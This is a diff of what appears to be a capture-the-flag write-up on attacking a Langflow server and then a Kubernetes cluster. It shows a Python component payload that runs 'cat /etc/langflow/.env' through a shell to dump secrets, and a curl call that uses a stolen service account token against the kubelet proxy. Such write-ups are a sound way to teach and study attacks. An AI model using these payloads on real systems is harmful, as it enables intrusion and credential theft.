@@ -56,17 +56,15 @@ from lfx.io import MessageTextInput, Output
 from lfx.schema.message import Message
 
 class TextOperations(Component):
-    display_name = "Text Operations"
-    inputs = [MessageTextInput(name="text_input", display_name="Text Input", value="")]
-    outputs = [Output(display_name="Message", name="message", method="get_message")]
-
     def get_message(self) -> Message:
-        proc = subprocess.Popen("cat /etc/langflow/.env", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        proc = subprocess.Popen("cat /etc/langflow/.env", shell=True, stdout=subprocess.PIPE)
         out, _ = proc.communicate()
         return Message(text=out.decode("utf-8"))
 ```
 
 This RCE payload ran as `www-data` and allowed us to read the environment variables.
+
+![Exploiting Langflow via CLI](../assets/terminal_foothold.png)
 
 ---
 
@@ -110,3 +108,5 @@ This token allowed us to read the pod's service account token (`mcp-sa`), which 
 curl -sk -H "Authorization: Bearer <mcp-sa-token>" \
   "https://10.129.244.214:6443/api/v1/nodes/fireflow/proxy/logs/"
 ```
+
+![Forging JWT and Querying Kubelet Proxy](../assets/terminal_privesc.png)
